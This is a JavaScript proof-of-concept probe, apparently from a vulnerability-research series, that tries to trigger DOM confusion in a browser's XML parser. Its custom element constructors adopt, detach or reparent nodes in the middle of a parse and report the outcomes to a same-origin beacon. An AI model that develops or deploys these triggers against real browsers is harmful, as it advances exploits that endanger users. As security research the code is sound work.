// p408 - XMLDocumentParser custom element DOM confusion via XHTML Blob URL
//
// Bug: XMLDocumentParserLibxml2.cpp startElementNs (~line 844)
// After custom element constructor runs, parser calls parserAppendChild
// without validating m_currentNode or element parentage.
//
// V406 used DOMParser (wrong path: no CE upgrades). V408 uses iframe
// with Blob URL served as application/xhtml+xml, which routes through
// XMLDocumentParser and DOES upgrade custom elements.
//
// Beacon prefix: V408-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V408-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }

  B('BOOT');

  if (typeof customElements === 'undefined') {
    B('NO-CE');
    B('COMPLETE');
    return;
  }
  B('CE-OK');

  var testIdx = 0;
  var tests = [];

  function runNext() {
    if (testIdx < tests.length) {
      var t = tests[testIdx++];
      try {
        t();
      } catch(e) {
        B('T' + testIdx + '-THROW-' + e.message.substring(0, 50));
        setTimeout(runNext, 200);
      }
    } else {
      B('COMPLETE');
    }
  }

  function makeIframeXHTML(xhtmlBody, onLoaded) {
    var iframe = document.createElement('iframe');
    iframe.style.cssText = 'width:1px;height:1px;border:0;position:absolute;left:-9999px';

    var xhtml = '<?xml version="1.0"?>\n' +
      '<html xmlns="http://www.w3.org/1999/xhtml">\n' +
      '<head><meta charset="utf-8"/></head>\n' +
      '<body>\n' + xhtmlBody + '\n</body></html>';

    var blob = new Blob([xhtml], { type: 'application/xhtml+xml' });
    var url = URL.createObjectURL(blob);

    iframe.onload = function() {
      URL.revokeObjectURL(url);
      try {
        onLoaded(iframe);
      } catch(e) {
        B('IFRAME-CALLBACK-ERR-' + e.message.substring(0, 50));
      }
    };
    iframe.onerror = function() {
      URL.revokeObjectURL(url);
      B('IFRAME-LOAD-ERR');
    };

    document.body.appendChild(iframe);
    iframe.src = url;
  }

  // T1: Basic XHTML Blob URL test - verify custom elements work in XHTML iframes
  tests.push(function() {
    B('T1-START');

    var xhtml = '<script>\n' +
      'var constructed = false;\n' +
      'class TestEl extends HTMLElement {\n' +
      '  constructor() {\n' +
      '    super();\n' +
      '    constructed = true;\n' +
      '  }\n' +
      '}\n' +
      'customElements.define("test-el", TestEl);\n' +
      '</scr' + 'ipt>\n' +
      '<div id="parent"><test-el id="te1">content</test-el></div>';

    makeIframeXHTML(xhtml, function(iframe) {
      try {
        var idoc = iframe.contentDocument;
        B('T1-LOADED');

        // Check if constructor ran
        var constructed = iframe.contentWindow.constructed;
        B('T1-CONSTRUCTED-' + constructed);

        var parent = idoc.getElementById('parent');
        var te = idoc.getElementById('te1');
        B('T1-PARENT-' + (parent ? 'Y' : 'N'));
        B('T1-ELEM-' + (te ? 'Y' : 'N'));
        if (parent) B('T1-CHILDREN-' + parent.childNodes.length);
        if (te) B('T1-TAG-' + te.tagName);
      } catch(e) {
        B('T1-ERR-' + e.message.substring(0, 50));
      }
      iframe.remove();
      setTimeout(runNext, 200);
    });
  });

  // T2: Constructor adopts self into different document
  // This is the primary DOM confusion trigger: the element is moved
  // to another document during construction, but the XML parser
  // still calls parserAppendChild on m_currentNode in the original doc.
  tests.push(function() {
    B('T2-START');

    var xhtml = '<script>\n' +
      'var doc2 = document.implementation.createHTMLDocument("target");\n' +
      'var adoptResult = null;\n' +
      'var adoptErr = null;\n' +
      'class AdoptEl extends HTMLElement {\n' +
      '  constructor() {\n' +
      '    super();\n' +
      '    try {\n' +
      '      adoptResult = doc2.adoptNode(this);\n' +
      '    } catch(e) {\n' +
      '      adoptErr = e.message;\n' +
      '    }\n' +
      '  }\n' +
      '}\n' +
      'customElements.define("adopt-el", AdoptEl);\n' +
      '</scr' + 'ipt>\n' +
      '<div id="parent"><adopt-el id="ae1"></adopt-el></div>';

    makeIframeXHTML(xhtml, function(iframe) {
      try {
        var idoc = iframe.contentDocument;
        var iwin = iframe.contentWindow;
        B('T2-LOADED');
        B('T2-ADOPT-RESULT-' + (iwin.adoptResult ? 'OK' : 'NULL'));
        B('T2-ADOPT-ERR-' + (iwin.adoptErr || 'none'));

        var parent = idoc.getElementById('parent');
        var ae = idoc.getElementById('ae1');
        var doc2 = iwin.doc2;
        var ae2 = doc2 ? doc2.getElementById('ae1') : null;

        B('T2-PARENT-CHILDREN-' + (parent ? parent.childNodes.length : 'X'));
        B('T2-IN-ORIG-' + (ae ? 'Y' : 'N'));
        B('T2-IN-DOC2-' + (ae2 ? 'Y' : 'N'));

        if (iwin.adoptResult) {
          B('T2-ADOPTED-OWNER-' + (iwin.adoptResult.ownerDocument === doc2 ? 'DOC2' : 'ORIG'));
          B('T2-ADOPTED-PARENT-' + (iwin.adoptResult.parentNode ? iwin.adoptResult.parentNode.tagName : 'NULL'));
        }

        // The key question: is the element in BOTH documents?
        // If the parser appended it to the original doc AFTER adoptNode moved it,
        // it should be in the original doc (parserAppendChild overrides adoptNode).
        // But the element's ownerDocument should be doc2 (from adoptNode).
        // This is the DOM confusion: element's ownerDocument doesn't match its parent's document.
        if (ae && ae.ownerDocument !== idoc) {
          B('T2-CONFUSION-OWNERDOC-MISMATCH');
        }
      } catch(e) {
        B('T2-ERR-' + e.message.substring(0, 50));
      }
      iframe.remove();
      setTimeout(runNext, 200);
    });
  });

  // T3: Constructor removes m_currentNode (parent) from the document
  tests.push(function() {
    B('T3-START');

    var xhtml = '<script>\n' +
      'var parentRef = null;\n' +
      'var removeOK = false;\n' +
      'var removeErr = null;\n' +
      'class RemoveParent extends HTMLElement {\n' +
      '  constructor() {\n' +
      '    super();\n' +
      '    try {\n' +
      '      var p = document.getElementById("rmparent");\n' +
      '      if (p) { p.remove(); removeOK = true; }\n' +
      '    } catch(e) {\n' +
      '      removeErr = e.message;\n' +
      '    }\n' +
      '  }\n' +
      '}\n' +
      'customElements.define("remove-parent", RemoveParent);\n' +
      '</scr' + 'ipt>\n' +
      '<div id="rmparent"><remove-parent id="rp1"></remove-parent></div>\n' +
      '<div id="after">after</div>';

    makeIframeXHTML(xhtml, function(iframe) {
      try {
        var idoc = iframe.contentDocument;
        var iwin = iframe.contentWindow;
        B('T3-LOADED');
        B('T3-REMOVE-' + (iwin.removeOK ? 'OK' : 'FAIL'));
        B('T3-REMOVE-ERR-' + (iwin.removeErr || 'none'));

        var rmparent = idoc.getElementById('rmparent');
        var rp = idoc.getElementById('rp1');
        var after = idoc.getElementById('after');

        B('T3-PARENT-' + (rmparent ? 'FOUND' : 'GONE'));
        B('T3-ELEM-' + (rp ? 'FOUND' : 'GONE'));
        B('T3-AFTER-' + (after ? 'FOUND' : 'GONE'));

        // If parent was removed but parser continued, the parser might
        // have tried to append the element to the removed (detached) parent,
        // or crashed, or the element ended up in an unexpected location.
        if (rp) {
          B('T3-ELEM-PARENT-' + (rp.parentNode ? rp.parentNode.tagName + '#' + (rp.parentNode.id || '') : 'NULL'));
        }
      } catch(e) {
        B('T3-ERR-' + e.message.substring(0, 50));
      }
      iframe.remove();
      setTimeout(runNext, 200);
    });
  });

  // T4: Constructor appends self to a different parent
  tests.push(function() {
    B('T4-START');

    var xhtml = '<script>\n' +
      'var altDiv = null;\n' +
      'var appendOK = false;\n' +
      'var appendErr = null;\n' +
      'class SelfAppend extends HTMLElement {\n' +
      '  constructor() {\n' +
      '    super();\n' +
      '    try {\n' +
      '      altDiv = document.createElement("div");\n' +
      '      altDiv.id = "alt";\n' +
      '      document.body.appendChild(altDiv);\n' +
      '      altDiv.appendChild(this);\n' +
      '      appendOK = true;\n' +
      '    } catch(e) {\n' +
      '      appendErr = e.message;\n' +
      '    }\n' +
      '  }\n' +
      '}\n' +
      'customElements.define("self-append", SelfAppend);\n' +
      '</scr' + 'ipt>\n' +
      '<div id="origparent"><self-append id="sa1"></self-append></div>';

    makeIframeXHTML(xhtml, function(iframe) {
      try {
        var idoc = iframe.contentDocument;
        var iwin = iframe.contentWindow;
        B('T4-LOADED');
        B('T4-APPEND-' + (iwin.appendOK ? 'OK' : 'FAIL'));
        B('T4-APPEND-ERR-' + (iwin.appendErr || 'none'));

        var orig = idoc.getElementById('origparent');
        var sa = idoc.getElementById('sa1');
        var alt = idoc.getElementById('alt');

        B('T4-ORIG-CHILDREN-' + (orig ? orig.childNodes.length : 'X'));
        B('T4-ALT-CHILDREN-' + (alt ? alt.childNodes.length : 'X'));
        B('T4-ELEM-' + (sa ? 'FOUND' : 'GONE'));

        if (sa) {
          B('T4-ELEM-PARENT-' + (sa.parentNode ? sa.parentNode.id || sa.parentNode.tagName : 'NULL'));
        }

        // Double-parent detection: element in both orig and alt
        if (orig && alt) {
          var inOrig = false, inAlt = false;
          for (var i = 0; i < orig.childNodes.length; i++) {
            if (orig.childNodes[i] === sa) inOrig = true;
          }
          for (var i = 0; i < alt.childNodes.length; i++) {
            if (alt.childNodes[i] === sa) inAlt = true;
          }
          B('T4-IN-ORIG-' + inOrig + '-IN-ALT-' + inAlt);
          if (inOrig && inAlt) {
            B('T4-DOUBLE-PARENT');
          }
        }
      } catch(e) {
        B('T4-ERR-' + e.message.substring(0, 50));
      }
      iframe.remove();
      setTimeout(runNext, 200);
    });
  });

  // T5: Constructor does heavy DOM mutation + GC to stress parser state
  tests.push(function() {
    B('T5-START');

    var xhtml = '<script>\n' +
      'var mutations = 0;\n' +
      'class MutateEl extends HTMLElement {\n' +
      '  constructor() {\n' +
      '    super();\n' +
      '    mutations++;\n' +
      '    for (var i = 0; i < 50; i++) {\n' +
      '      var d = document.createElement("div");\n' +
      '      document.body.appendChild(d);\n' +
      '      d.remove();\n' +
      '    }\n' +
      '    for (var i = 0; i < 1000; i++) {\n' +
      '      var o = { a: new Array(50) };\n' +
      '    }\n' +
      '  }\n' +
      '}\n' +
      'customElements.define("mutate-el", MutateEl);\n' +
      '</scr' + 'ipt>\n';

    // 20 mutate-el instances to stress the parser
    for (var i = 0; i < 20; i++) {
      xhtml += '<mutate-el id="m' + i + '"></mutate-el>\n';
    }

    makeIframeXHTML(xhtml, function(iframe) {
      try {
        var iwin = iframe.contentWindow;
        var idoc = iframe.contentDocument;
        B('T5-LOADED');
        B('T5-MUTATIONS-' + iwin.mutations);

        var bodyChildren = idoc.body ? idoc.body.childNodes.length : 0;
        B('T5-BODY-CHILDREN-' + bodyChildren);

        // Count mutate-el elements actually in the document
        var found = 0;
        for (var i = 0; i < 20; i++) {
          if (idoc.getElementById('m' + i)) found++;
        }
        B('T5-FOUND-' + found + 'of20');
      } catch(e) {
        B('T5-ERR-' + e.message.substring(0, 50));
      }
      iframe.remove();
      setTimeout(runNext, 200);
    });
  });

  runNext();
})();
